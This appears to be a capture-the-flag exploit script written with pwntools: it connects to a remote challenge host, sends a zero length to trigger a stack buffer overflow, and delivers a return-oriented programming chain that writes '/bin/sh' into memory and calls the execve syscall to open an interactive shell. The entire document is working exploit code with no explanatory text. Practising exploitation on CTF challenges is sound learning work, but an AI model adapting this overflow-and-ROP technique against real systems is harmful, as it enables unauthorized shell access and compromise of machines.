from pwn import *

if __name__ == "__main__":
    #io = process('./chall')
    io = remote('chall.eng.run',31885)
    exe = ELF('./chall')
    io.sendlineafter(b'Enter length of input:','0')
    ropchain=[
        'A'*0x28,
        exe.sym.pop_rax+4,
        '/bin/sh\x00',
        exe.sym.pop_rdi+4,
        0x00601040,
        exe.sym.mov+4,
        exe.sym.pop_rax+4,
        0x3b,
        exe.sym.pop_rsi+4,
        0x0,
        exe.sym.sys_call+4
    ]
    io.sendlineafter(b'Enter text:\n',flat(ropchain,arch='amd64'))
    io.interactive()